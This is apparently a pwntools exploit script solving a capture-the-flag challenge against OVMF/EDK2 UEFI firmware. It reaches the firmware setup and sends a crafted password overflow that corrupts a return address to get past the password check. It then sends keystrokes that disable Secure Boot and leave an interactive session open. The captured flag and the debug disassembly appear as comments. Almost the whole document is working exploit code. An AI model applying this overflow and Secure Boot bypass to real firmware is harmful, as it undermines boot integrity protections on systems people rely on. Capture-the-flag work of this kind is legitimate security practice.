#!/usr/bin/env python
from pwn import *

# CTF{pl4y1ng_with_v1rt_3F1_just_4fun}

#host , port = 'secureboot.ctfcompetition.com' , 1337
#y = process( './run.py' )
y = process( [ 'socat' , '-' , 'tcp:secureboot.ctfcompetition.com:1337' ] )

'''
!!!! Find image based on IP(0x67CD36D) /home/google-ctf/edk2/Build/OvmfX64/RELEASE_GCC5/X64/MdeModulePkg/Application/UiApp/UiApp/DEBUG/UiApp.dll (ImageBase=00000000067CB000, EntryPoint=00000000067D3CB4) !!!!
Base: 0x67CB000

b *0x67dafa4
b *0x67db0bb
'''

ESC = '\x1B'

# for enter BIOS
for i in range( 0x70 ):
    y.send( ESC )


y.sendafter( 'Password?' , '\r' ) # first try
y.sendafter( 'Password?' , '\r' ) # second try

p = '\x05' * 0x20
p = p.ljust( 0x20 , '\x01' )
p = p.ljust( 0x88 , 'a' )
p += p32( 0x7ec18b8 - 0x20 + 1 ) # stack address of return address - hash_len + 1 -> overflow 1 byte '\x13' offset

'''
return address = 0x67d4d13

   0x67d4d13:	sbb    BYTE PTR [rcx],al
   0x67d4d15:	add    dh,al
   0x67d4d17:	add    eax,0x11dfc
   0x67d4d1c:	add    DWORD PTR [rcx+0x11e9d05],ecx
   0x67d4d22:	add    BYTE PTR [rbx+0x118a705],cl
   0x67d4d28:	add    BYTE PTR [rcx+0x11e8d05],cl
   0x67d4d2e:	add    al,ch
   0x67d4d30:	sbb    al,0x61
   0x67d4d32:	add    BYTE PTR [rax],al
   0x67d4d34:	test   al,al
   0x67d4d36:	jne    0x67d4d49
   0x67d4d38:	lea    rcx,[rip+0xa11f]        # 0x67dee5e
   0x67d4d3f:	call   0x67cc3fd
   0x67d4d44:	jmp    0x67d5eb6
=> 0x67d4d49:	cmp    BYTE PTR [rip+0x11e00],0x0        # 0x67e6b50
'''

y.sendafter( 'Password?' , p + '\r' )


UP = '\x1b\x5b\x41'
DOWN = '\x1b\x5b\x42'
LEFT = '\x1b\x5b\x43'
RIGHT = '\x1b\x5b\x44'
ENTER = '\r'

y.send( DOWN )
y.send( ENTER ) # Device Manager

y.send( ENTER ) # Secure Boot Configuration
y.send( DOWN ) # Attempt Secure Boot [x]
y.send( ' ' )  # Attempt Secure Boot [ ]
y.send( ENTER )

y.send( ESC ) # back
y.send( ESC ) # back

y.send( DOWN )
y.send( DOWN )
y.send( DOWN )
y.send( DOWN )
y.send( ENTER ) # reset and continue booting

y.interactive()